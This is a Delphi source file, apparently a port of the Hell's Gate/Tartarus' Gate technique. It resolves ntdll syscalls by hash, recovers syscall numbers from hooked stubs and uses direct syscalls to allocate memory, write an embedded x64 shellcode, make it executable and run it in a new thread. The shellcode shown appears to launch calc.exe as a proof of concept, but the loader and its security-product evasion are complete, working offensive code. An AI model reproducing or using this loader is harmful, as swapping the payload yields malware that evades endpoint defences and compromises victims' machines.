program Tartarus;

{$APPTYPE CONSOLE}
{$R *.res}
{$POINTERMATH ON}
{$ALIGN 8}
{$MINENUMSIZE 4}
{$OVERFLOWCHECKS OFF}
{$RANGECHECKS OFF}

uses
  System.SysUtils,
  Windows,
  structs in 'structs.pas',
  HellsGateAsm in 'HellsGateAsm.pas';

const
  UP = -32; // Used for searching up in memory
  DOWN = 32; // Used for searching down in memory

const
  MEM_COMMIT = $1000;
  PAGE_READWRITE = $04;
  PAGE_EXECUTE_READ = $20;
  INVALID_HANDLE_VALUE = THandle(-1);

type
  LPTHREAD_START_ROUTINE = function(lpThreadParameter: Pointer): DWORD; stdcall;
  SIZE_T = NativeUInt;
  NTSTATUS = LongInt;

  // --------------------------------------------------------------------
  // VX Tables - Structures for storing function information
  // --------------------------------------------------------------------
type
  // Entry for a single function
  _VX_TABLE_ENTRY = record
    pAddress: PVOID; // Function address
    dwHash: DWORD64; // Hash of function name
    wSystemCall: WORD; // System call number
  end;

  VX_TABLE_ENTRY = _VX_TABLE_ENTRY;
  PVX_TABLE_ENTRY = ^VX_TABLE_ENTRY;

  // Table containing all needed function entries
  _VX_TABLE = record
    NtAllocateVirtualMemory: VX_TABLE_ENTRY;
    NtProtectVirtualMemory: VX_TABLE_ENTRY;
    NtCreateThreadEx: VX_TABLE_ENTRY;
    NtWriteVirtualMemory: VX_TABLE_ENTRY;
    NtWaitForSingleObject: VX_TABLE_ENTRY;
  end;

  VX_TABLE = _VX_TABLE;
  PVX_TABLE = ^VX_TABLE;

type
  PIMAGE_EXPORT_DIRECTORY = ^IMAGE_EXPORT_DIRECTORY;

  // Forward function declarations
function RtlGetThreadEnvironmentBlock: PTEB; forward;
function djb2(str: PBYTE): DWORD64; forward;
function GetImageExportDirectory(pModuleBase: PVOID;
  out ppImageExportDirectory: PIMAGE_EXPORT_DIRECTORY): BOOL; forward;
function GetVxTableEntry(pModuleBase: PVOID;
  pImageExportDirectory: PIMAGE_EXPORT_DIRECTORY;
  pVxTableEntry: PVX_TABLE_ENTRY): BOOL; forward;
function Payload(pVxTable: PVX_TABLE): BOOL; forward;
function VxMoveMemory(dest: PVOID; const src: PVOID; len: SIZE_T)
  : PVOID; forward;
function Main: Integer; forward;

// --------------------------------------------------------------------
// Implementation Section
// --------------------------------------------------------------------

// Gets the Thread Environment Block using assembly
function RtlGetThreadEnvironmentBlock: PTEB;
asm
  {$IFDEF WIN64}
  mov rax, gs:[30h]    // 64-bit: Read TEB from GS segment offset 0x30
  {$ELSE}
  mov eax, fs:[16h]    // 32-bit: Read TEB from FS segment offset 0x16
  {$ENDIF}
end;

// Implements DJB2 hashing algorithm for function name hashing
function djb2(str: PBYTE): DWORD64;
var
  c: Integer;
  dwHash: DWORD64;
begin
  dwHash := $7734773477347734; // Initial hash value

  while True do
  begin
    c := Integer(str^);
    if c = 0 then
      Break;
    Inc(str);
    dwHash := ((dwHash shl 5) + dwHash) + c;
  end;

  Result := dwHash;
end;

// Gets the Export Directory from a PE module
function GetImageExportDirectory(pModuleBase: PVOID;
  out ppImageExportDirectory: PIMAGE_EXPORT_DIRECTORY): BOOL;
var
  pImageDosHeader: PIMAGE_DOS_HEADER;
  pImageNtHeaders: PIMAGE_NT_HEADERS;
begin
  // Get and verify DOS header
  pImageDosHeader := PIMAGE_DOS_HEADER(pModuleBase);
  if pImageDosHeader.e_magic <> IMAGE_DOS_SIGNATURE then
  begin
    Result := False;
    Exit;
  end;

  // Get and verify NT headers
  pImageNtHeaders := PIMAGE_NT_HEADERS(PBYTE(pModuleBase) +
    pImageDosHeader.e_lfanew);
  if pImageNtHeaders.Signature <> IMAGE_NT_SIGNATURE then
  begin
    Result := False;
    Exit;
  end;

  // Get the Export Address Table
  ppImageExportDirectory := PIMAGE_EXPORT_DIRECTORY
    (PBYTE(pModuleBase) + pImageNtHeaders.OptionalHeader.DataDirectory
    [IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
  Result := True;
end;

// Main program entry point
[STAThread]
function Main: Integer;
var
  pCurrentTeb: PTEB;
  pCurrentPeb: PPEB;
  pLdrDataEntry: PLDR_DATA_TABLE_ENTRY;
  pImageExportDirectory: PIMAGE_EXPORT_DIRECTORY;
  Table: VX_TABLE;
begin

  WriteLn('Starting program...');

  // Get current TEB and PEB
  pCurrentTeb := RtlGetThreadEnvironmentBlock();
  pCurrentPeb := pCurrentTeb.ProcessEnvironmentBlock;

  // Verify PEB and Windows 10
  if (pCurrentPeb = nil) or (pCurrentTeb = nil) or
    (pCurrentPeb.OSMajorVersion <> $A) then
  begin
    Result := $1;
    Exit;
  end;

  // Get NTDLL module
  pLdrDataEntry := PLDR_DATA_TABLE_ENTRY
    (PBYTE(pCurrentPeb.LoaderData.InMemoryOrderModuleList.Flink.Flink) - $10);

  // Get the Export Address Table of NTDLL
  pImageExportDirectory := nil;
  if not GetImageExportDirectory(pLdrDataEntry.DllBase, pImageExportDirectory)
    or (pImageExportDirectory = nil) then
  begin
    Result := $1;
    Exit;
  end;

  // Initialize VX_TABLE
  FillChar(Table, SizeOf(VX_TABLE), 0);

  // Setup all required system calls
  // These hashes correspond to the function names in NTDLL

  // Memory allocation function
  Table.NtAllocateVirtualMemory.dwHash := $F5BD373480A6B89B;
  if not GetVxTableEntry(pLdrDataEntry.DllBase, pImageExportDirectory,
    @Table.NtAllocateVirtualMemory) then
  begin
    Result := $1;
    Exit;
  end;

  // Thread creation function
  Table.NtCreateThreadEx.dwHash := $64DC7DB288C5015F;
  if not GetVxTableEntry(pLdrDataEntry.DllBase, pImageExportDirectory,
    @Table.NtCreateThreadEx) then
  begin
    Result := $1;
    Exit;
  end;

  // Memory writing function
  Table.NtWriteVirtualMemory.dwHash := $68A3C2BA486F0741;
  if not GetVxTableEntry(pLdrDataEntry.DllBase, pImageExportDirectory,
    @Table.NtWriteVirtualMemory) then
  begin
    Result := $1;
    Exit;
  end;

  // Memory protection function
  Table.NtProtectVirtualMemory.dwHash := $858BCB1046FB6A37;
  if not GetVxTableEntry(pLdrDataEntry.DllBase, pImageExportDirectory,
    @Table.NtProtectVirtualMemory) then
  begin
    Result := $1;
    Exit;
  end;

  // Object waiting function
  Table.NtWaitForSingleObject.dwHash := $C6A2FA174E551BCB;
  if not GetVxTableEntry(pLdrDataEntry.DllBase, pImageExportDirectory,
    @Table.NtWaitForSingleObject) then
  begin
    Result := $1;
    Exit;
  end;

  // Execute main payload
  Payload(@Table);
  Result := $0;
end;

function GetVxTableEntry(pModuleBase: PVOID;
  pImageExportDirectory: PIMAGE_EXPORT_DIRECTORY;
  pVxTableEntry: PVX_TABLE_ENTRY): BOOL;
var
  pdwAddressOfFunctions: PDWORD;
  pdwAddressOfNames: PDWORD;
  pwAddressOfNameOrdinales: PWORD;
  cx: WORD;
  idx: WORD;
  pczFunctionName: PAnsiChar;
  pFunctionAddress: PBYTE; // Changed to PBYTE
  high, low: BYTE;
begin
  WriteLn('Getting VX Table Entry...');
  WriteLn(Format('Export Directory NumberOfNames: %d',
    [pImageExportDirectory.NumberOfNames]));

  pdwAddressOfFunctions :=
    PDWORD(PBYTE(pModuleBase) + pImageExportDirectory.AddressOfFunctions);
  pdwAddressOfNames :=
    PDWORD(PBYTE(pModuleBase) + pImageExportDirectory.AddressOfNames);
  pwAddressOfNameOrdinales :=
    PWORD(PBYTE(pModuleBase) + pImageExportDirectory.AddressOfNameOrdinals);

  for cx := 0 to pImageExportDirectory.NumberOfNames - 1 do
  begin
    pczFunctionName := PAnsiChar(PBYTE(pModuleBase) + pdwAddressOfNames[cx]);
    pFunctionAddress := PBYTE(pModuleBase) + pdwAddressOfFunctions
      [pwAddressOfNameOrdinales[cx]];

    if djb2(PBYTE(pczFunctionName)) = pVxTableEntry.dwHash then
    begin
      WriteLn(Format('Found matching function: %s', [pczFunctionName]));
      WriteLn(Format('Function Address: %p', [pFunctionAddress]));

      pVxTableEntry.pAddress := pFunctionAddress;

      // Check for normal syscall pattern
      if (pFunctionAddress[0] = $4C) and (pFunctionAddress[1] = $8B) and
        (pFunctionAddress[2] = $D1) and (pFunctionAddress[3] = $B8) and
        (pFunctionAddress[6] = $00) and (pFunctionAddress[7] = $00) then
      begin
        high := pFunctionAddress[5];
        low := pFunctionAddress[4];
        pVxTableEntry.wSystemCall := (high shl 8) or low;
        WriteLn(Format('Found syscall number: %.4x',
          [pVxTableEntry.wSystemCall]));
        Result := True;
        Exit;
      end
      else
      begin
        WriteLn('Pattern not found at start of function');
        WriteLn(Format('Found bytes: %.2x %.2x %.2x %.2x %.2x %.2x %.2x %.2x',
          [pFunctionAddress[0], pFunctionAddress[1], pFunctionAddress[2],
          pFunctionAddress[3], pFunctionAddress[4], pFunctionAddress[5],
          pFunctionAddress[6], pFunctionAddress[7]]));
      end;

      // Check for hook at start (E9 = JMP)
      if pFunctionAddress[0] = $E9 then
      begin
        for idx := 1 to 500 do
        begin
          // Check down
          if (pFunctionAddress[idx * DOWN + 0] = $4C) and
            (pFunctionAddress[idx * DOWN + 1] = $8B) and
            (pFunctionAddress[idx * DOWN + 2] = $D1) and
            (pFunctionAddress[idx * DOWN + 3] = $B8) and
            (pFunctionAddress[idx * DOWN + 6] = $00) and
            (pFunctionAddress[idx * DOWN + 7] = $00) then
          begin
            high := pFunctionAddress[idx * DOWN + 5];
            low := pFunctionAddress[idx * DOWN + 4];
            pVxTableEntry.wSystemCall := (high shl 8) or low - idx;
            Result := True;
            Exit;
          end;

          // Check up
          if (pFunctionAddress[idx * UP + 0] = $4C) and
            (pFunctionAddress[idx * UP + 1] = $8B) and
            (pFunctionAddress[idx * UP + 2] = $D1) and
            (pFunctionAddress[idx * UP + 3] = $B8) and
            (pFunctionAddress[idx * UP + 6] = $00) and
            (pFunctionAddress[idx * UP + 7] = $00) then
          begin
            high := pFunctionAddress[idx * UP + 5];
            low := pFunctionAddress[idx * UP + 4];
            pVxTableEntry.wSystemCall := (high shl 8) or low + idx;
            Result := True;
            Exit;
          end;
        end;
        Result := False;
        Exit;
      end;
    end;
  end;

  Result := True;
end;

function Payload(pVxTable: PVX_TABLE): BOOL;
const
  Payload: array [0 .. 275] of BYTE = ($FC, $48, $83, $E4, $F0, $E8, $C0, $00,
    $00, $00, $41, $51, $41, $50, $52, $51, $56, $48, $31, $D2, $65, $48, $8B,
    $52, $60, $48, $8B, $52, $18, $48, $8B, $52, $20, $48, $8B, $72, $50, $48,
    $0F, $B7, $4A, $4A, $4D, $31, $C9, $48, $31, $C0, $AC, $3C, $61, $7C, $02,
    $2C, $20, $41, $C1, $C9, $0D, $41, $01, $C1, $E2, $ED, $52, $41, $51, $48,
    $8B, $52, $20, $8B, $42, $3C, $48, $01, $D0, $8B, $80, $88, $00, $00, $00,
    $48, $85, $C0, $74, $67, $48, $01, $D0, $50, $8B, $48, $18, $44, $8B, $40,
    $20, $49, $01, $D0, $E3, $56, $48, $FF, $C9, $41, $8B, $34, $88, $48, $01,
    $D6, $4D, $31, $C9, $48, $31, $C0, $AC, $41, $C1, $C9, $0D, $41, $01, $C1,
    $38, $E0, $75, $F1, $4C, $03, $4C, $24, $08, $45, $39, $D1, $75, $D8, $58,
    $44, $8B, $40, $24, $49, $01, $D0, $66, $41, $8B, $0C, $48, $44, $8B, $40,
    $1C, $49, $01, $D0, $41, $8B, $04, $88, $48, $01, $D0, $41, $58, $41, $58,
    $5E, $59, $5A, $41, $58, $41, $59, $41, $5A, $48, $83, $EC, $20, $41, $52,
    $FF, $E0, $58, $41, $59, $5A, $48, $8B, $12, $E9, $57, $FF, $FF, $FF, $5D,
    $48, $BA, $01, $00, $00, $00, $00, $00, $00, $00, $48, $8D, $8D, $01, $01,
    $00, $00, $41, $BA, $31, $8B, $6F, $87, $FF, $D5, $BB, $F0, $B5, $A2, $56,
    $41, $BA, $A6, $95, $BD, $9D, $FF, $D5, $48, $83, $C4, $28, $3C, $06, $7C,
    $0A, $80, $FB, $E0, $75, $05, $BB, $47, $13, $72, $6F, $6A, $00, $59, $41,
    $89, $DA, $FF, $D5, $63, $61, $6C, $63, $2E, $65, $78, $65, $00);

var
  status: NTSTATUS;
  lpAddress: PVOID;
  sDataSize: SIZE_T;
  writtenBytes: ULONG;
  ulOldProtect: ULONG;
  protectSize: SIZE_T;
  hHostThread: THandle;
  Timeout: LARGE_INTEGER;
  BaseAddress: PVOID;
begin
  Result := False;

  // Allocate memory
  lpAddress := nil;
  sDataSize := SizeOf(Payload);
  protectSize := sDataSize;

  HellsGate(pVxTable.NtAllocateVirtualMemory.wSystemCall);
  WriteLN(PChar(Format('About to call syscall: %d', [wSystemCall])));
  status := HellDescentAllocMem(THandle(-1), lpAddress, 0, sDataSize,
    MEM_COMMIT, PAGE_READWRITE);
  // if Status <> 0 then Exit;
  WriteLN(PChar(Format('Syscall result: %d', [status])));

  // Write memory
  writtenBytes := 0;
  HellsGate(pVxTable.NtWriteVirtualMemory.wSystemCall);
  WriteLN(PChar(Format('Before WriteMemory - syscall: %d, Address: %p, Size: %d',[wSystemCall, lpAddress, sDataSize])));
  status := HellDescentWriteMem(THandle(-1), lpAddress, @Payload[0], sDataSize,
    writtenBytes);
  WriteLN(PChar(Format('After WriteMemory - Status: %d, WrittenBytes: %d',
  [status, writtenBytes])));
  // if Status <> 0 then Exit;

  // Change page permissions
  ulOldProtect := 0;
  HellsGate(pVxTable.NtProtectVirtualMemory.wSystemCall);
  WriteLN(PChar(Format('Before ProtectMem - syscall: %d, Address: %p, Size: %d',
  [wSystemCall, lpAddress, protectSize])));
  status := HellDescentProtectMem(THandle(-1), lpAddress, protectSize,
    PAGE_EXECUTE_READ, ulOldProtect);
  WriteLN(PChar(Format('After ProtectMem - Status: %d, OldProtect: %d',
  [status, ulOldProtect])));
  // if Status <> 0 then Exit;

  // Create thread
  hHostThread := INVALID_HANDLE_VALUE;
  HellsGate(pVxTable.NtCreateThreadEx.wSystemCall);
  WriteLN(PChar(Format('Before CreateThread - syscall: %d, Address: %p',[wSystemCall, lpAddress])));
  status := HellDescentCreateThread(hHostThread, // var ThreadHandle: THandle
    $1FFFFF, // DesiredAccess: DWORD
    nil, // ObjectAttributes: Pointer
    THandle(-1), // ProcessHandle: THandle
    LPTHREAD_START_ROUTINE(lpAddress), // StartRoutine: LPTHREAD_START_ROUTINE
    nil, // Argument: Pointer
    DWORD(0), // CreateFlags: ULONG (change false to 0)
    0, // ZeroBits: SIZE_T (change nil to 0)
    0, // StackSize: SIZE_T (change nil to 0)
    0, // MaximumStackSize: SIZE_T (change nil to 0)
    nil // AttributeList: Pointer
    );
    WriteLN(PChar(Format('After CreateThread - Status: %d, ThreadHandle: %d',
  [status, hHostThread])));
  // if Status <> 0 then Exit;

  // Wait for 1 second
  Timeout.QuadPart := -10000000;
  HellsGate(pVxTable.NtWaitForSingleObject.wSystemCall);
  status := HellDescentWaitObject(hHostThread, False, @Timeout);

  Result := True;

end;

function VxMoveMemory(dest: PVOID; const src: PVOID; len: SIZE_T): PVOID;
var
  d: PBYTE;
  s: PBYTE;
  lasts: PBYTE;
  lastd: PBYTE;
begin
  d := PBYTE(dest);
  s := PBYTE(src);

  if NativeUInt(d) < NativeUInt(s) then
  begin
    // Copy forward
    while len > 0 do
    begin
      d^ := s^;
      Inc(d);
      Inc(s);
      Dec(len);
    end;
  end
  else
  begin
    // Copy backward
    lasts := PBYTE(NativeUInt(s) + (len - 1));
    lastd := PBYTE(NativeUInt(d) + (len - 1));
    while len > 0 do
    begin
      lastd^ := lasts^;
      Dec(lastd);
      Dec(lasts);
      Dec(len);
    end;
  end;

  Result := dest;
end;

begin
  try
    ExitCode := Main();
    WriteLn('Press Enter to exit...');
    ReadLn;
  except
    on E: Exception do
    begin
      WriteLn(E.ClassName, ': ', E.Message);
      WriteLn('Press Enter to exit...');
      ReadLn;
    end;
  end;

end.
